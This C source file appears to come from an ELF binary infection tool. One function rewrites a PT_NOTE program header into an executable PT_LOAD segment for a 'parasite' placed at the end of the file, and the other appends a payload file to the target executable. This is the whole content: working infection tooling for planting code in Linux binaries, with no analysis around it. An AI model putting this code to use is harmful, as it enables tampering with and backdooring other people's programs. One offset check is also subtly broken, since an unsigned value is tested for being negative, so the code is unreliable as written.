#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <assert.h>
#include "elfinjections.h"
#define PAGE_SIZE 4096
#define BUFFER_SIZE 256

int inject_PT_NOTE(Elf64_Addr target_addr,
                   size_t target_sz,
                   struct map_entry *target_file,
                   struct segment_entry *target_segment)
{
    Elf64_Addr correction;
    printf("Addr %lx Size %lx\n", target_file->m_addr, target_file->m_sz);
    Elf64_Ehdr *ehdr = target_file->m_addr;
    assert(memcmp(ehdr, ELFMAG, SELFMAG) == 0);
    for(size_t ph_index=0; ph_index < ehdr->e_phnum; ph_index++) {
        Elf64_Phdr *phdr = (Elf64_Phdr *) ((char *) target_file->m_addr + ehdr->e_phoff
            + ph_index*ehdr->e_phentsize);
        if (phdr->p_type == PT_NOTE) {
            printf("Found PT_NOTE in entry %d\n", ph_index);
            phdr->p_type = PT_LOAD;
            phdr->p_flags |= PF_X;
            phdr->p_offset = target_file->m_sz; // parasite will be at the end
            // one way of making target_addr congruent with offset mod page size
            correction = phdr->p_offset % PAGE_SIZE - target_addr % PAGE_SIZE;
            if (correction < 0)
                correction += PAGE_SIZE;
            phdr->p_paddr = phdr->p_vaddr = target_addr + correction;
            phdr->p_filesz = phdr->p_memsz = target_sz;
            target_segment->s_sz = phdr->p_filesz;
            target_segment->s_offset = phdr->p_offset;
            target_segment->s_addr = phdr->p_vaddr;
            printf("Segment changed, offset: %x addr: %x, sz: %x\n",
                   target_segment->s_offset, target_segment->s_addr,
                   target_segment->s_sz);
            phdr->p_align = PAGE_SIZE;
            return EXIT_SUCCESS;
        }
    }
    return EXIT_FAILURE;
}

int append_payload(char *target_filepath,
                   char *payload_filepath)
{
    int target_fd = open(target_filepath, O_APPEND | O_RDWR);
    assert(target_fd >= 0);
    int payload_fd = open(payload_filepath, O_RDONLY);
    assert(payload_fd >= 0);
    char buffer[BUFFER_SIZE];
    ssize_t n_readbytes;
    ssize_t n_writebytes;
    size_t total_copied = 0;
    while (n_readbytes = read(payload_fd, buffer, BUFFER_SIZE)) {
        n_writebytes = write(target_fd, buffer, n_readbytes);
        assert(n_writebytes == n_readbytes);
        total_copied += n_readbytes;
    }
    printf("Payload added: 0x%lx bytes\n", total_copied);
    close(target_fd);
    close(payload_fd);
    return 0;
}
